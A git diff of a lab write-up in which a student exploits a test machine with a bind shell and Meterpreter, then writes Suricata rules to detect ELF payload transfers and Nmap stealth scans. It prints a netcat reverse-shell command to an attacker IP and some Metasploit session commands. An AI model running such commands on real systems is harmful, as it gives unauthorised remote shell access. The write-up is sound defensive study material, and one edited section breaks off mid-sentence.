@@ -173,6 +173,7 @@ Note that once the vulnerability was exploited and a bind shell was spawned, the
 
 This command listened for connections on port 17000. Thereafter, in the spawned shell, the following was executed to connect another shell session to the attacker:<br>
 ```nc -e /bin/bash 192.168.8.134 17000```<br>
+
 Below is the command used to listen for this reverse shell connection, the output showing successful connection and some commands to setup better utility of the reverse shell:
 
 <img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/attacker-reverse-shell.png?raw=true">
@@ -208,10 +209,7 @@ From there, a Meterpreter listener was then set up using the following sequence:
 
 <img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/listener-setup-and-connect.png">
 
-Note that the payload, LHOST and LPORT values were specifically set to match those used to create the meterpreter payload. The exploit was done with the -j switch to run it in the background. The bind shell session number was then confirmed and brought to the foreground. The Meterpreter payload was then executed in the background. Once Metasploit notified that a Meterpreter session was created, the bind shell was again put into the background and the session switched to Meterpreter's using:<br>
-```sessions -i 2```<br>
-
-The appearance of the Meterpreter shell prompt validated the success of the exploit. The system information from ```sysinfo``` and the IP address from ```ifconfig``` were used to confirm the system under control:
+Note that the payload, LHOST and LPORT values were specifically set to match those used to create the meterpreter payload. The exploit was executed as a job to run it in the background. The attacker then switched to the bind shell session. The Meterpreter payload was then executed in the background. Once Metasploit notified that a Meterpreter session was created, the attacker switched to the Meterpreter session (confirmed by the corresponding prompt). The system information from ```sysinfo``` and the IP address from ```ifconfig``` were used to confirm the system under control:
 
 <img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/meterpreter-system-confirmation.png">
 
@@ -220,7 +218,7 @@ Since the victim was made to download an ELF payload, the Suricata rule was craf
 alert tcp any any -> $HOME_NET any (msg:"ELF file transfer detected"; flow:to_client, established; content:"|7F 45 4C 46|"; offset:0; depth:4; sid:1000008; rev:1;)
 ```
 
-This rule flags outbound payload transfers where the payload's header starts with the ELF magic number (0x7F 45 4C 46), indicating an ELF file transfer.
+This rule flags outbound payload transfers where the payload's header starts with the ELF magic number (0x7F454C46), indicating an ELF file transfer.
 
 ## Evaluation and Improvements:
 
@@ -231,9 +229,13 @@ Common patterns within the nmap-stealth.pcap file (see image below) used to craf
 - A large number of packets was sent from the attacker in a short timeframe
 - The window size was fixed at 1024
 
-<img src="">
+<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/stealth-pcap.png?raw=true">
 
-Crafting the rule with the above properties in mind was done to cover as many characteristics of a basic attack as possible. The fixed window size is a default setting used in Nmap scans as is the singular source IP address. Furthermore, the rule detected the T3 timing setting (default for the scan run in this attack) and should be able to detect settings as low as T1, approximately 6 packets/10 sec. Given that the challenge was to write 1 rule, it served its purpose by successfully detecting the attacks.
+The selected properties were chosen to capture as many fundamental characteristics of stealth scans as possible. The fixed window size, singular source IP address, and default probe frequency setting (T3) were all default parameters of the scan. The rule was designed to account for these defaults while also adapting to variations in probe frequency, ranging from T1 (on the lower end) to as high as T5. Such evasive techniques manipulate packet transmission frequency to evade detection. While flexible in addressing probe frequency, the rule does not address more sophisticated evasion techniques that alter window sizes, use carefully crafted delays or even scan a smaller port range. Nevertheless, given that the challenge was to write 1 rule, it successfully served its purpose and could be used to detect basic scans such as those performed by script kiddies. To improve its efficacy against more sophisticated scans, more rules should be developted to address evasion techniques targeting various other aspects of the packets captured. 
+
+### OS Fingerprinting
+
+From the nmap-os
 
 - Analyze Suricata logs to validate detections and refine rules.
 - Review false positives/negatives and adjust rule sensitivity.
